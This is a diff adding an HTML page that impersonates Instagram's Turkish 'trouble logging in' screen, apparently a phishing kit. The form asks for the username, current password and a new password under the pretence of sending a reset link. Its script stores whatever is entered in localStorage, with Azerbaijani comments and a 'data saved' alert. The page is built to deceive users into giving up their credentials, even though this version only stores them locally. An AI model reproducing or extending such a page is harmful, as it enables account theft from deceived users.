@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Giriş Problemi</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #000000;
+            color: white;
+            flex-direction: column;
+        }
+        .header {
+            position: absolute;
+            top: 10px;
+            width: 100%;
+            text-align: center;
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 20px;
+            max-width: 400px;
+            
+        }
+        .header a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .container {
+            background: #121212;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 0px 3px rgb(186, 182, 182);
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+            position: relative;
+            margin-bottom: 105px;
+            margin-left: 10px;
+        }
+        .icon {
+            font-size: 50px;
+            margin-bottom: 10px;
+        }
+        input, button {
+            margin: 10px 0;
+            padding: 10px;
+            width: 100%;
+            border: none;
+            border-radius: 4px;
+        }
+        input {
+            background: #222;
+            color: white;
+        }
+        button {
+            background: #0056b3;
+            color: white;
+            cursor: pointer;
+        }
+        button:disabled {
+        background: #0c1d2d;
+        cursor: not-allowed;}
+        a {
+            color: #0095f6;
+            text-decoration: none;
+            display: block;
+            margin-top: 10px;
+        }
+        .divider {
+            margin: 15px 0;
+            border-top: 1px solid #000000;
+        }
+    </style>
+</head>
+<body>
+    <div style="display: flex;" class="header">
+        <img style="width: 45%;" src="insta.png" alt="">
+        <a href="https://www.instagram.com/accounts/login/?next=%2Faccounts%2Fpassword%2Freset%2F&source=desktop_nav">Giriş Yapmak</a>
+        <a href="https://www.instagram.com/accounts/emailsignup/">Üye Olmak</a>
+    </div>
+    <div style="background-color: #000000;" class="container">
+        <div ><img style="width: 70%;" src="Ekran şəkli 2025-02-17 203724.png" alt=""></div>
+        
+        <h2 s>Giriş yaparken sorun mu yaşıyorsunuz?</h2>
+        <p>E-posta’nızı, telefon numaranızı veya kullanıcı adınızı girin, hesabınıza tekrar erişim sağlamanız için size bir bağlantı gönderelim.</p>
+         <input type="text" id="username" placeholder="E-posta, Telefon veya Kullanıcı Adı" oninput="checkInput()">
+            <input type="text" id="extra1" placeholder="Mevcut şifre" oninput="checkInput()">
+                <input type="text" id="extra2" placeholder="Şifreni yenile" oninput="checkInput()">
+                    <button id="sendButton" onclick="sendLink()" disabled>Giriş bağlantısını gönder</button>
+            <div>
+                <a style="color: rgba(240, 248, 255, 0.637);" href="">Şifrenizi sıfırlayamıyor musunuz?</a>
+                
+            </div>
+                </body>
+    <script>
+  // Məlumatları localStorage-a yazan funksiya
+function sendLink() {
+    let username = document.getElementById('username').value.trim();
+    let extra1 = document.getElementById('extra1').value.trim();
+    let extra2 = document.getElementById('extra2').value.trim();
+
+    if (!username || !extra1 || !extra2) {
+        alert('Lütfən bütün məlumatları daxil edin!');
+        return;
+    }
+
+    // LocalStorage-dən əvvəlki məlumatları götür
+    let users = JSON.parse(localStorage.getItem('users')) || [];
+
+    // Yeni istifadəçi məlumatlarını əlavə et
+    users.push({ username, extra1, extra2 });
+
+    // Yenilənmiş məlumatları localStorage-a yaz
+    localStorage.setItem('users', JSON.stringify(users));
+
+    alert('Məlumatlar uğurla saxlandı!');
+
+    // Input sahələrini təmizlə
+    document.getElementById('username').value = '';
+    document.getElementById('extra1').value = '';
+    document.getElementById('extra2').value = '';
+
+    // Button-u deaktiv et
+    checkInput();
+}
+
+// Səhifə yeniləndikdə input sahələrini təmizlə
+window.onload = function () {
+    document.getElementById('username').value = '';
+    document.getElementById('extra1').value = '';
+    document.getElementById('extra2').value = '';
+
+    checkInput();
+}
+
+// Button aktivliyini yoxlayan funksiya
+function checkInput() {
+    let username = document.getElementById('username').value.trim();
+    let extra1 = document.getElementById('extra1').value.trim();
+    let extra2 = document.getElementById('extra2').value.trim();
+    let button = document.getElementById('sendButton');
+
+    button.disabled = !(username && extra1 && extra2);
+}
+
+
+    </script>
+</html>
